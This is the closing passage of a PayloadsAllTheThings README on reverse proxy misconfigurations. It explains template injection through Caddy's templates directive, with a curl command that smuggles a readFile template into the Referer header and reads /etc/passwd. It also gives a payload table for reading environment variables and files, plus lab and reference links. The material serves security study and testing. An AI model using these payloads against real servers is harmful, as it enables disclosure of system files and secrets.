<!-- source: Reverse Proxy Misconfigurations/README.md | chunk 2/2 | MIT — Copyright (c) 2019 Swissky (PayloadsAllTheThings) -->

    root * /
    templates
    respond "You came from {http.request.header.Referer}"
}
```

This tells Caddy to process the response string as a template, and interpolate any variables (using Go template syntax) present in the referenced request header.

In this curl request, the attacker supplied as `Referer` header a Go template expression: `{{readFile "etc/passwd"}}`.

```ps1
curl -H 'Referer: {{readFile "etc/passwd"}}' http://localhost/
```

```ps1
HTTP/1.1 200 OK
Content-Length: 716
Content-Type: text/plain; charset=utf-8
Server: Caddy
Date: Thu, 24 Jul 2025 08:00:50 GMT

You came from root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
```

Because Caddy is running the templates directive, it will evaluate anything in curly braces inside the context, including things from untrusted input. The `readFile` function is available in Caddy templates, so the attacker's input causes Caddy to actually read `/etc/passwd` and insert its content into the HTTP response.

| Payload                       | Description                   |
| ----------------------------- | ----------------------------- |
| `{{env "VAR_NAME"}}`          | Get an environment variable   |
| `{{listFiles "/"}}`           | List all files in a directory |
| `{{readFile "path/to/file"}}` | Read a file                   |

## Labs

* [Root Me - Nginx - Alias Misconfiguration](https://www.root-me.org/en/Challenges/Web-Server/Nginx-Alias-Misconfiguration)
* [Root Me - Nginx - Root Location Misconfiguration](https://www.root-me.org/en/Challenges/Web-Server/Nginx-Root-Location-Misconfiguration)
* [Root Me - Nginx - SSRF Misconfiguration](https://www.root-me.org/en/Challenges/Web-Server/Nginx-SSRF-Misconfiguration)
* [Detectify - Vulnerable Nginx](https://github.com/detectify/vulnerable-nginx)

## References

* [What is X-Forwarded-For and when can you trust it? - Phil Sturgeonopens - January 31, 2024](https://web.archive.org/web/20260112224231/https://httptoolkit.com/blog/what-is-x-forwarded-for/)
* [Common Nginx misconfigurations that leave your web server open to attack - Detectify - November 10, 2020](https://web.archive.org/web/20260227155031/https://blog.detectify.com/industry-insights/common-nginx-misconfigurations-that-leave-your-web-server-ope-to-attack/)
